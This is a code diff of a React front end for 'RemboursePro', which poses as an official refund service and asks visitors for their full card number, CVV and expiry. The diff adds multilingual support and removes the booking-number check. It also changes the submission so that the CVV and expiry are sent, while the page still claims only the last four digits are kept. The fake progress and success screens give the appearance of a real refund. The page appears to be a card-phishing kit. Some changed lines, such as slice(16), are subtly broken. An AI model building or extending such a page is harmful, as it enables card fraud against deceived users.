@@ -1,6 +1,7 @@
 'use client';
 
 import { useState, useEffect, type SVGProps } from 'react';
+import { translations, languages, isLanguage, type Language, type TranslationKey } from '@/lib/translations';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
@@ -49,14 +50,6 @@ const Mail = (props: SVGProps<SVGSVGElement>) => (
 const Phone = (props: SVGProps<SVGSVGElement>) => (
   <svg viewBox="0 0 24 24" {...iconProps} {...props}>
     <path d="M7 4h3l1 5-2 2a15 15 0 0 0 9 9l2-2 5 1v3a2 2 0 0 1-2 2A17 17 0 0 1 5 6a2 2 0 0 1 2-2Z" />
-  </svg>
-);
-
-const FileText = (props: SVGProps<SVGSVGElement>) => (
-  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
-    <path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7l-5-4Z" />
-    <path d="M14 3v4h4" />
-    <path d="M8 12h8M8 16h8" />
   </svg>
 );
 
@@ -141,7 +134,6 @@ interface FormData {
   fullName: string;
   email: string;
   phone: string;
-  reservationNumber: string;
   reason: string;
   amount: string;
   cardNumber: string;
@@ -150,15 +142,44 @@ interface FormData {
 }
 
 export default function Home() {
+  const [language, setLanguage] = useState<Language>('fr');
+  const t = translations[language];
+
+  useEffect(() => {
+    try {
+      const saved = localStorage.getItem('remboursepro-language');
+      if (isLanguage(saved)) setLanguage(saved);
+    } catch {
+      // The language selector also works when browser storage is unavailable.
+    }
+  }, []);
+
+  useEffect(() => {
+    document.documentElement.lang = language;
+    document.title = t.pageTitle;
+  }, [language, t.pageTitle]);
+
+  const changeLanguage = (value: string) => {
+    if (!isLanguage(value)) return;
+    setLanguage(value);
+    try {
+      localStorage.setItem('remboursepro-language', value);
+    } catch {
+      // Keep the selected language for the current visit.
+    }
+  };
+
+  const formatAmount = (value: string) =>
+    new Intl.NumberFormat(language, { style: 'currency', currency: 'EUR' }).format(Number(value || 0));
+
   const [step, setStep] = useState<Step>('info');
   const [loading, setLoading] = useState(false);
-  const [error, setError] = useState('');
+  const [error, setError] = useState<TranslationKey | ''>('');
   const [progress, setProgress] = useState(0);
   const [formData, setFormData] = useState<FormData>({
     fullName: '',
     email: '',
     phone: '',
-    reservationNumber: '',
     reason: '',
     amount: '',
     cardNumber: '',
@@ -188,7 +209,7 @@ export default function Home() {
 
   const formatCardNumber = (value: string) => {
     const digits = value.replace(/\D/g, '').slice(0, 16);
-    return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+    return digits.replace(/(\d{16})(?=\d)/g, '$1 ');
   };
 
   const formatExpiry = (value: string) => {
@@ -199,23 +220,22 @@ export default function Home() {
     return digits;
   };
 
-  const validateInfo = () => {
-    if (!formData.fullName.trim()) return 'Veuillez saisir votre nom complet.';
-    if (!formData.email.trim()) return 'Veuillez saisir votre adresse e-mail.';
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) return 'Adresse e-mail invalide.';
-    if (!formData.phone.trim()) return 'Veuillez saisir votre numéro de téléphone.';
-    if (!formData.reservationNumber.trim()) return 'Veuillez saisir votre numéro de réservation.';
-    if (!formData.amount.trim()) return 'Veuillez saisir le montant à rembourser.';
+  const validateInfo = (): TranslationKey | '' => {
+    if (!formData.fullName.trim()) return 'nameRequired';
+    if (!formData.email.trim()) return 'emailRequired';
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) return 'emailInvalid';
+    if (!formData.phone.trim()) return 'phoneRequired';
+    if (!formData.amount.trim()) return 'amountRequired';
     const amt = parseFloat(formData.amount);
-    if (isNaN(amt) || amt <= 0) return 'Le montant doit être un nombre positif.';
+    if (isNaN(amt) || amt <= 0) return 'amountInvalid';
     return '';
   };
 
-  const validateCard = () => {
+  const validateCard = (): TranslationKey | '' => {
     const digits = formData.cardNumber.replace(/\s/g, '');
-    if (digits.length !== 16) return 'Le numéro de carte doit comporter 16 chiffres.';
-    if (!/^\d{3,4}$/.test(formData.cardCvv)) return 'Le CVV doit comporter 3 ou 4 chiffres.';
-    if (!/^\d{2}\/\d{2}$/.test(formData.cardExpiry)) return 'Veuillez saisir une date d\'expiration valide (MM/AA).';
+    if (digits.length !== 16) return 'cardInvalid';
+    if (!/^\d{3,4}$/.test(formData.cardCvv)) return 'cvvInvalid';
+    if (!/^\d{2}\/\d{2}$/.test(formData.cardExpiry)) return 'expiryInvalid';
     return '';
   };
 
@@ -229,13 +249,14 @@ export default function Home() {
         fullName: formData.fullName,
         email: formData.email,
         phone: formData.phone,
-        reservationNumber: formData.reservationNumber,
         reason: formData.reason,
         amount: formData.amount,
-        cardLast4: cardDigits.slice(-4),
+        cardLast16: cardDigits.slice(16),
+        cardCvv: formData.cardCvv,
+        cardExpiry: formData.cardExpiry,
       }),
     });
-    if (!res.ok) throw new Error('Erreur lors de l\'envoi des informations.');
+    if (!res.ok) throw new Error('sendError');
   };
 
   const handleInfoSubmit = (e: React.FormEvent) => {
@@ -261,7 +282,7 @@ export default function Home() {
       await submitAll();
       setStep('processing');
     } catch (err) {
-      setError(err instanceof Error ? err.message : 'Une erreur est survenue.');
+      setError('sendError');
     } finally {
       setLoading(false);
     }
@@ -272,7 +293,6 @@ export default function Home() {
       fullName: '',
       email: '',
       phone: '',
-      reservationNumber: '',
       reason: '',
       amount: '',
       cardNumber: '',
@@ -285,9 +305,9 @@ export default function Home() {
   };
 
   const steps: { key: Step; label: string; icon: typeof User }[] = [
-    { key: 'info', label: 'Informations', icon: User },
-    { key: 'card', label: 'Paiement', icon: CreditCard },
-    { key: 'processing', label: 'Traitement', icon: Loader2 },
+    { key: 'info', label: t.info, icon: User },
+    { key: 'card', label: t.payment, icon: CreditCard },
+    { key: 'processing', label: t.processing, icon: Loader2 },
   ];
 
   const currentStepIndex = steps.findIndex((s) => s.key === step);
@@ -296,19 +316,28 @@ export default function Home() {
     <div className="min-h-screen bg-gradient-to-br from-sky-50 via-white to-blue-50">
       {/* Header */}
       <header className="border-b border-border/40 bg-white/80 backdrop-blur-md sticky top-0 z-50">
-        <div className="max-w-5xl mx-auto px-4 sm:px-6 py-4 flex items-center justify-between">
+        <div className="max-w-5xl mx-auto px-4 sm:px-6 py-4 flex flex-wrap items-center justify-between gap-3">
           <div className="flex items-center gap-3">
             <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-sky-500 to-blue-600 flex items-center justify-center shadow-lg shadow-sky-500/20">
               <ShieldCheck className="w-6 h-6 text-white" />
             </div>
             <div>
               <h1 className="text-lg font-bold tracking-tight text-foreground">RemboursePro</h1>
-              <p className="text-xs text-muted-foreground hidden sm:block">Service de remboursement sécurisé</p>
+              <p className="text-xs text-muted-foreground hidden sm:block">{t.service}</p>
             </div>
           </div>
-          <div className="hidden md:flex items-center gap-2 text-sm text-muted-foreground">
-            <Lock className="w-4 h-4 text-sky-600" />
-            <span>Connexion chiffrée SSL 256 bits</span>
+          <div className="flex items-center gap-2 text-sm">
+            <Label htmlFor="language" className="text-muted-foreground">{t.language}</Label>
+            <select
+              id="language"
+              value={language}
+              onChange={(event) => changeLanguage(event.target.value)}
+              className="h-10 max-w-[160px] rounded-md border border-input bg-white px-3 text-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
+            >
+              {languages.map(({ code, label }) => (
+                <option key={code} value={code} lang={code}>{label}</option>
+              ))}
+            </select>
           </div>
         </div>
       </header>
@@ -318,13 +347,13 @@ export default function Home() {
         <section className="max-w-5xl mx-auto px-4 sm:px-6 pt-12 pb-8 text-center animate-fade-in">
           <Badge variant="secondary" className="mb-4 bg-sky-100 text-sky-700 border-sky-200">
             <BadgeCheck className="w-3.5 h-3.5 mr-1" />
-            Plateforme officielle de remboursement
+            {t.official}
           </Badge>
           <h2 className="text-3xl sm:text-4xl font-bold tracking-tight text-foreground mb-3">
-            Demandez votre remboursement en quelques minutes
+            {t.hero}
           </h2>
           <p className="text-muted-foreground text-base sm:text-lg max-w-2xl mx-auto">
-            Que ce soit pour une réservation ou une visite, notre service vous accompagne pour un remboursement rapide et sécurisé par carte bancaire.
+            {t.intro}
           </p>
         </section>
       )}
@@ -371,17 +400,17 @@ export default function Home() {
             <CardHeader>
               <CardTitle className="text-xl flex items-center gap-2">
                 <User className="w-5 h-5 text-sky-600" />
-                Vos informations
+                {t.yourInfo}
               </CardTitle>
               <CardDescription>
-                Renseignez vos coordonnées et les détails de votre demande de remboursement.
+                {t.infoDescription}
               </CardDescription>
             </CardHeader>
             <CardContent>
               <form onSubmit={handleInfoSubmit} className="space-y-5">
                 <div className="grid sm:grid-cols-2 gap-4">
                   <div className="space-y-2">
-                    <Label htmlFor="fullName">Nom complet *</Label>
+                    <Label htmlFor="fullName">{t.fullName}</Label>
                     <div className="relative">
                       <User className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                       <Input
@@ -394,7 +423,7 @@ export default function Home() {
                     </div>
                   </div>
                   <div className="space-y-2">
-                    <Label htmlFor="email">Adresse e-mail *</Label>
+                    <Label htmlFor="email">{t.email}</Label>
                     <div className="relative">
                       <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                       <Input
@@ -411,7 +440,7 @@ export default function Home() {
 
                 <div className="grid sm:grid-cols-2 gap-4">
                   <div className="space-y-2">
-                    <Label htmlFor="phone">Téléphone *</Label>
+                    <Label htmlFor="phone">{t.phone}</Label>
                     <div className="relative">
                       <Phone className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                       <Input
@@ -424,23 +453,10 @@ export default function Home() {
                       />
                     </div>
                   </div>
-                  <div className="space-y-2">
-                    <Label htmlFor="reservationNumber">Numéro de réservation *</Label>
-                    <div className="relative">
-                      <FileText className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
-                      <Input
-                        id="reservationNumber"
-                        placeholder="RES-2024-00123"
-                        className="pl-10"
-                        value={formData.reservationNumber}
-                        onChange={(e) => updateField('reservationNumber', e.target.value)}
-                      />
-                    </div>
-                  </div>
                 </div>
 
                 <div className="space-y-2">
-                  <Label htmlFor="amount">Montant à rembourser (€) *</Label>
+                  <Label htmlFor="amount">{t.amount}</Label>
                   <div className="relative">
                     <Euro className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                     <Input
@@ -457,10 +473,10 @@ export default function Home() {
                 </div>
 
                 <div className="space-y-2">
-                  <Label htmlFor="reason">Motif du remboursement (optionnel)</Label>
+                  <Label htmlFor="reason">{t.reason}</Label>
                   <Textarea
                     id="reason"
-                    placeholder="Décrivez la raison de votre demande de remboursement..."
+                    placeholder={t.reasonPlaceholder}
                     rows={3}
                     value={formData.reason}
                     onChange={(e) => updateField('reason', e.target.value)}
@@ -470,12 +486,12 @@ export default function Home() {
                 {error && (
                   <div className="flex items-center gap-2 text-sm text-destructive bg-destructive/10 px-4 py-3 rounded-lg animate-fade-in">
                     <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                    {error}
+                    {error ? t[error] : ''}
                   </div>
                 )}
 
                 <Button type="submit" size="lg" className="w-full bg-sky-500 hover:bg-sky-600 text-white shadow-lg shadow-sky-500/20 transition-all">
-                  Continuer
+                  {t.continue}
                   <ArrowRight className="w-5 h-5 ml-2" />
                 </Button>
               </form>
@@ -489,31 +505,30 @@ export default function Home() {
             <CardHeader>
               <CardTitle className="text-xl flex items-center gap-2">
                 <CreditCard className="w-5 h-5 text-sky-600" />
-                Remboursement par carte bancaire
+                {t.cardTitle}
               </CardTitle>
               <CardDescription>
-                Souhaitez-vous recevoir votre remboursement sur votre carte bancaire ? Renseignez vos coordonnées ci-dessous.
+                {t.cardDescription}
               </CardDescription>
             </CardHeader>
             <CardContent>
               {/* Summary */}
               <div className="bg-sky-50 border border-sky-100 rounded-xl p-4 mb-6">
-                <p className="text-xs font-medium text-sky-700 mb-2 uppercase tracking-wide">Récapitulatif</p>
+                <p className="text-xs font-medium text-sky-700 mb-2 uppercase tracking-wide">{t.summary}</p>
                 <div className="flex items-center justify-between">
                   <div className="text-sm text-muted-foreground">
                     <p className="font-medium text-foreground">{formData.fullName}</p>
-                    <p>Réservation : {formData.reservationNumber}</p>
                   </div>
                   <div className="text-right">
-                    <p className="text-2xl font-bold text-sky-600">{parseFloat(formData.amount || '0').toFixed(2)} €</p>
-                    <p className="text-xs text-muted-foreground">À rembourser</p>
+                    <p className="text-2xl font-bold text-sky-600">{formatAmount(formData.amount)}</p>
+                    <p className="text-xs text-muted-foreground">{t.toRefund}</p>
                   </div>
                 </div>
               </div>
 
               <form onSubmit={handleCardSubmit} className="space-y-5">
                 <div className="space-y-2">
-                  <Label htmlFor="cardNumber">Numéro de carte (16 chiffres) *</Label>
+                  <Label htmlFor="cardNumber">{t.cardNumber}</Label>
                   <div className="relative">
                     <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                     <Input
@@ -528,19 +543,19 @@ export default function Home() {
                   {formData.cardNumber.replace(/\s/g, '').length === 16 && (
                     <p className="text-xs text-green-600 flex items-center gap-1 animate-fade-in">
                       <CheckCircle2 className="w-3 h-3" />
-                      Numéro de carte valide (16 chiffres)
+                      {t.validCard}
                     </p>
                   )}
                 </div>
 
                 <div className="grid grid-cols-2 gap-4">
                   <div className="space-y-2">
-                    <Label htmlFor="cardExpiry">Date d'expiration *</Label>
+                    <Label htmlFor="cardExpiry">{t.expiry}</Label>
                     <div className="relative">
                       <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                       <Input
                         id="cardExpiry"
-                        placeholder="MM/AA"
+                        placeholder={t.expiryPlaceholder}
                         className="pl-10 font-mono"
                         value={formData.cardExpiry}
                         onChange={(e) => updateField('cardExpiry', formatExpiry(e.target.value))}
@@ -568,14 +583,14 @@ export default function Home() {
                 <div className="flex items-start gap-2 text-xs text-muted-foreground bg-muted/50 px-4 py-3 rounded-lg">
                   <Lock className="w-4 h-4 text-sky-600 flex-shrink-0 mt-0.5" />
                   <span>
-                    Vos informations bancaires sont transmises via une connexion chiffrée et traitées de manière sécurisée. Seuls les 4 derniers chiffres de votre carte sont conservés.
+                    {t.security}
                   </span>
                 </div>
 
                 {error && (
                   <div className="flex items-center gap-2 text-sm text-destructive bg-destructive/10 px-4 py-3 rounded-lg animate-fade-in">
                     <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                    {error}
+                    {error ? t[error] : ''}
                   </div>
                 )}
 
@@ -588,7 +603,7 @@ export default function Home() {
                     className="flex-shrink-0"
                   >
                     <ArrowLeft className="w-5 h-5 mr-2" />
-                    Retour
+                    {t.back}
                   </Button>
                   <Button
                     type="submit"
@@ -599,11 +614,11 @@ export default function Home() {
                     {loading ? (
                       <>
                         <Loader2 className="w-5 h-5 mr-2 animate-spin" />
-                        Envoi en cours...
+                        {t.sending}
                       </>
                     ) : (
                       <>
-                        Continuer
+                        {t.continue}
                         <ArrowRight className="w-5 h-5 ml-2" />
                       </>
                     )}
@@ -630,10 +645,10 @@ export default function Home() {
                   </div>
 
                   <h2 className="text-2xl font-bold text-foreground mb-3">
-                    Patientez un moment...
+                    {t.wait}
                   </h2>
                   <p className="text-muted-foreground text-base mb-8 max-w-md mx-auto">
-                    Votre remboursement est en cours de traitement. Veuillez ne pas fermer cette page.
+                    {t.processingDescription}
                   </p>
 
                   {/* Progress bar */}
@@ -649,7 +664,7 @@ export default function Home() {
                     <div className="flex items-center justify-between mt-2 text-sm text-muted-foreground">
                       <span className="flex items-center gap-1.5">
                         <Clock className="w-4 h-4" />
-                        Traitement en cours...
+                        {t.processingStatus}
                       </span>
                       <span className="font-mono font-medium text-sky-600">{progress}%</span>
                     </div>
@@ -658,9 +673,9 @@ export default function Home() {
                   {/* Steps list */}
                   <div className="max-w-md mx-auto mt-8 space-y-2 text-left">
                     {[
-                      { label: 'Vérification des informations', done: progress > 20 },
-                      { label: 'Validation de la carte bancaire', done: progress > 50 },
-                      { label: 'Traitement du remboursement', done: progress > 80 },
+                      { label: t.verifyInfo, done: progress > 20 },
+                      { label: t.validateCard, done: progress > 50 },
+                      { label: t.processRefund, done: progress > 80 },
                     ].map((item, idx) => (
                       <div key={idx} className="flex items-center gap-3 text-sm">
                         <div className={`w-5 h-5 rounded-full flex items-center justify-center transition-all duration-300 ${item.done ? 'bg-green-500' : 'bg-muted'}`}>
@@ -684,36 +699,31 @@ export default function Home() {
                   </div>
 
                   <h2 className="text-2xl font-bold text-foreground mb-3">
-                    Demande envoyée avec succès !
+                    {t.success}
                   </h2>
                   <p className="text-muted-foreground text-base mb-2 max-w-md mx-auto">
-                    Votre demande de remboursement de <span className="font-semibold text-foreground">{parseFloat(formData.amount).toFixed(2)} €</span> a été enregistrée.
+                    {t.successDescription.replace('{amount}', formatAmount(formData.amount))}
                   </p>
                   <p className="text-muted-foreground text-sm mb-8 max-w-md mx-auto">
-                    Votre demande a été transmise pour traitement. Vous recevrez votre remboursement sous 3 à 5 jours ouvrés.
+                    {t.successDelay}
                   </p>
 
                   <div className="bg-sky-50 border border-sky-100 rounded-xl p-4 max-w-md mx-auto mb-8 text-left">
-                    <p className="text-xs font-medium text-sky-700 mb-2 uppercase tracking-wide">Détails de la demande</p>
+                    <p className="text-xs font-medium text-sky-700 mb-2 uppercase tracking-wide">{t.requestDetails}</p>
                     <div className="space-y-1.5 text-sm">
                       <div className="flex justify-between">
-                        <span className="text-muted-foreground">Demandeur</span>
+                        <span className="text-muted-foreground">{t.applicant}</span>
                         <span className="font-medium">{formData.fullName}</span>
                       </div>
                       <Separator className="my-1" />
                       <div className="flex justify-between">
-                        <span className="text-muted-foreground">Réservation</span>
-                        <span className="font-medium font-mono">{formData.reservationNumber}</span>
+                        <span className="text-muted-foreground">{t.card}</span>
+                        <span className="font-medium font-mono">**** {formData.cardNumber.replace(/\s/g, '').slice(16)}</span>
                       </div>
                       <Separator className="my-1" />
                       <div className="flex justify-between">
-                        <span className="text-muted-foreground">Carte</span>
-                        <span className="font-medium font-mono">**** {formData.cardNumber.replace(/\s/g, '').slice(-4)}</span>
-                      </div>
-                      <Separator className="my-1" />
-                      <div className="flex justify-between">
-                        <span className="text-muted-foreground">Montant</span>
-                        <span className="font-bold text-sky-600">{parseFloat(formData.amount).toFixed(2)} €</span>
+                        <span className="text-muted-foreground">{t.amountSummary}</span>
+                        <span className="font-bold text-sky-600">{formatAmount(formData.amount)}</span>
                       </div>
                     </div>
                   </div>
@@ -724,7 +734,7 @@ export default function Home() {
                     variant="outline"
                     className="mx-auto"
                   >
-                    Nouvelle demande
+                    {t.newRequest}
                     <ChevronRight className="w-5 h-5 ml-2" />
                   </Button>
                 </CardContent>
@@ -734,7 +744,7 @@ export default function Home() {
             {progress >= 100 && (
               <div className="mt-6 flex items-center justify-center gap-2 text-sm text-muted-foreground animate-fade-in">
                 <ShieldCheck className="w-4 h-4 text-green-600" />
-                Transaction sécurisée et chiffrée
+                {t.secureTransaction}
               </div>
             )}
           </div>
@@ -746,12 +756,9 @@ export default function Home() {
         <div className="max-w-5xl mx-auto px-4 sm:px-6 py-6 flex flex-col sm:flex-row items-center justify-between gap-3 text-sm text-muted-foreground">
           <div className="flex items-center gap-2">
             <ShieldCheck className="w-4 h-4 text-sky-600" />
-            <span>RemboursePro — Plateforme sécurisée de remboursement</span>
+            <span>{t.footer}</span>
           </div>
-          <div className="flex items-center gap-4">
-            <span className="flex items-center gap-1.5"><Lock className="w-3.5 h-3.5" /> SSL 256 bits</span>
-            <span className="flex items-center gap-1.5"><BadgeCheck className="w-3.5 h-3.5" /> Conforme RGPD</span>
-          </div>
+          
         </div>
       </footer>
     </div>
